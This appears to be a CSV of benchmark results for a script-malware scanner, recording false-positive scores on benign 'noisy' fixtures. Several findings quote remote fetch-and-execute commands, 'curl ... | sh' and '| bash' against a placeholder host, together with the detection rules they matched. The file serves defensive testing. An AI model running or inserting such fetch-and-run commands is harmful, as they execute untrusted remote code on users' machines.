run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-14T13-54-59Z-e5cff3","noisy_applescript_finder_batch_rename_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_finder_batch_rename_01.applescript","appleScript","53","suspicious","benign_noisy","10","28","false","false","verdict_too_high","completed","","1911","2026-03-14T13:56:17.565Z","true","","静态证据链：脚本可控制 Finder 进行文件操作，需要结合上下文评估风险。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 17/100。 AI 模型结果：malicious，恶意概率 0.845，风险桶 恶意倾向明显，评分调整 +36。","50","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L3-3 Δ8: tell application ""Finder"" | RandomForest model flagged sample as high risk (malicious, p=0.845)."
"2026-03-14T13-54-59Z-e5cff3","noisy_applescript_terminal_echo_pwd_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_terminal_echo_pwd_01.applescript","appleScript","11","clean","benign_noisy","12","30","true","false","score_too_low","completed","","1850","2026-03-14T13:56:19.415Z","true","","静态证据链：脚本可驱动 Terminal 执行命令，存在行为链隐藏风险。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 21/100。 AI 模型结果：benign，恶意概率 0.204，风险桶 偏正常，评分调整 -10。","8","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-14T13-54-59Z-e5cff3","noisy_js_child_process_ls_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_child_process_ls_01.js","javaScript","67","suspicious","benign_noisy","12","30","false","false","verdict_too_high","completed","","1887","2026-03-14T13:56:21.303Z","true","","静态证据链：检测到 child_process 模块使用，可直接执行 shell 或二进制命令。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 37/100。 AI 模型结果：malicious，恶意概率 0.767，风险桶 恶意倾向明显，评分调整 +30。","64","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | RandomForest model flagged sample as high risk (malicious, p=0.767). | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","noisy_js_eval_math_only_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_eval_math_only_01.js","javaScript","53","clean","benign_noisy","15","35","true","false","score_too_high","completed","","1861","2026-03-14T13:56:23.165Z","true","","静态证据链：检测到 eval/Function 构造动态代码执行，存在混淆载荷风险。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 31/100。 AI 模型结果：malicious，恶意概率 0.615，风险桶 可疑，评分调整 +22。","50","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L3-3 Δ22: const result = eval(expression); | RandomForest model flagged sample as high risk (malicious, p=0.615). | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","noisy_js_network_cache_text_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_network_cache_text_01.js","javaScript","36","suspicious","benign_noisy","14","32","false","false","verdict_too_high","completed","","1920","2026-03-14T13:56:25.085Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.800，风险桶 恶意倾向明显，评分调整 +36。","36","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.800)."
"2026-03-14T13-54-59Z-e5cff3","noisy_js_postinstall_sim_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_postinstall_sim_01.js","javaScript","100","malicious","benign_noisy","20","42","false","false","verdict_too_high","completed","","1937","2026-03-14T13:56:27.023Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 73/100。 AI 模型结果：malicious，恶意概率 0.782，风险桶 恶意倾向明显，评分调整 +30。","100","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl https://example.invalid/pkg | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl https://example.invalid/pkg | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://example.invalid/pkg | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://example.invalid/pkg | sh | RandomForest model flagged sample as high risk (malicious, p=0.782). | Threat intel [regexp] hit: curl https://example.invalid/pkg | Threat intel [regexp] hit: curl https://example.invalid/pkg | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","noisy_pkg_fixture_02","noisy_benign","pkg","pkg_directory_fixture","noisy_benign/pkg/noisy_pkg_fixture_02","pkg","11","clean","benign_noisy","15","35","true","false","score_too_low","completed","","2892","2026-03-14T13:56:29.915Z","true","","静态证据链：Package pre/post install scripts can execute with installer privileges.。最终 Clean（低风险），得分 11/100。","11","pkg fixture contains install script entries | Quick probe skipped full payload traversal for pkg-like directory. | RandomForest prediction output is incomplete; skipped model fusion. | generic_partial: Quick probe skipped full payload traversal for pkg-like directory. | generic_partial: RandomForest prediction output is incomplete; skipped model fusion."
"2026-03-14T13-54-59Z-e5cff3","noisy_pkg_preinstall_sim_01","noisy_benign","pkg","file_fixture","noisy_benign/pkg/noisy_pkg_preinstall_sim_01.sh","shellScript","36","suspicious","benign_noisy","22","48","false","true","verdict_too_high","completed","","1900","2026-03-14T13:56:31.816Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.890，风险桶 恶意倾向明显，评分调整 +36。","36","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.890)."
"2026-03-14T13-54-59Z-e5cff3","noisy_python_build_subprocess_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_build_subprocess_01.py","pythonScript","57","clean","benign_noisy","12","28","true","false","score_too_high","completed","","1895","2026-03-14T13:56:33.711Z","true","","静态证据链：检测到 subprocess.run/call/Popen，脚本可直接拉起外部二进制或 shell。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 35/100。 AI 模型结果：malicious，恶意概率 0.684，风险桶 可疑，评分调整 +22。","54","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(step, check=True, capture_output=True, text=True) | RandomForest model flagged sample as high risk (malicious, p=0.684). | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","noisy_python_dynamic_loader_sim_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_dynamic_loader_sim_01.py","pythonScript","30","suspicious","benign_noisy","16","35","false","true","verdict_too_high","completed","","1913","2026-03-14T13:56:35.625Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.733，风险桶 可疑，评分调整 +30。","30","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.733)."
"2026-03-14T13-54-59Z-e5cff3","noisy_python_remote_text_api_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_remote_text_api_01.py","pythonScript","30","suspicious","benign_noisy","14","32","false","true","verdict_too_high","completed","","1843","2026-03-14T13:56:37.469Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.759，风险桶 恶意倾向明显，评分调整 +30。","30","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.759)."
"2026-03-14T13-54-59Z-e5cff3","noisy_python_tempfile_cleanup_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_tempfile_cleanup_01.py","pythonScript","30","suspicious","benign_noisy","10","24","false","false","verdict_too_high","completed","","1904","2026-03-14T13:56:39.373Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.745，风险桶 可疑，评分调整 +30。","30","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.745)."
"2026-03-14T13-54-59Z-e5cff3","noisy_python_updater_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_updater_01.py","pythonScript","36","suspicious","benign_noisy","20","45","false","true","verdict_too_high","completed","","1974","2026-03-14T13:56:41.347Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.828，风险桶 恶意倾向明显，评分调整 +36。","36","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.828)."
"2026-03-14T13-54-59Z-e5cff3","noisy_shell_appsupport_style_write_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_appsupport_style_write_01.sh","shellScript","48","malicious","benign_noisy","10","24","false","false","verdict_too_high","completed","","1925","2026-03-14T13:56:43.273Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.980，风险桶 高危恶意，评分调整 +48。","48","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.980)."
"2026-03-14T13-54-59Z-e5cff3","noisy_shell_base64_config_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_base64_config_01.sh","shellScript","48","malicious","benign_noisy","12","30","false","false","verdict_too_high","completed","","1820","2026-03-14T13:56:45.093Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.978，风险桶 高危恶意，评分调整 +48。","48","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.978)."
"2026-03-14T13-54-59Z-e5cff3","noisy_shell_chmod_tool_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_chmod_tool_01.sh","shellScript","42","malicious","benign_noisy","10","26","false","false","verdict_too_high","completed","","1881","2026-03-14T13:56:46.975Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.919，风险桶 高危恶意，评分调整 +42。","42","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.919)."
"2026-03-14T13-54-59Z-e5cff3","noisy_shell_installer_like_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_installer_like_01.sh","shellScript","100","malicious","benign_noisy","20","45","false","false","verdict_too_high","completed","","1861","2026-03-14T13:56:48.837Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 98/100。 AI 模型结果：malicious，恶意概率 0.971，风险桶 高危恶意，评分调整 +48。","143","检测到远程下载执行链 | Threat intel profile matched 2 rules | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L8-8 Δ35: DANGEROUS_LOOKING_CMD='curl -fsSL https://example.invalid/installer.sh | bash' | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ14: curl -fssl https://example.invalid/installer.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ14: curl -fssl https://example.invalid/installer.sh | bash | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.invalid/installer.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.invalid/installer.sh | bash | RandomForest model flagged sample as high risk (malicious, p=0.971). | Threat intel [regexp] hit: curl -fssl https://example.invalid/installer.sh | Threat intel [regexp] hit: curl -fssl https://example.invalid/installer.sh | bash | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
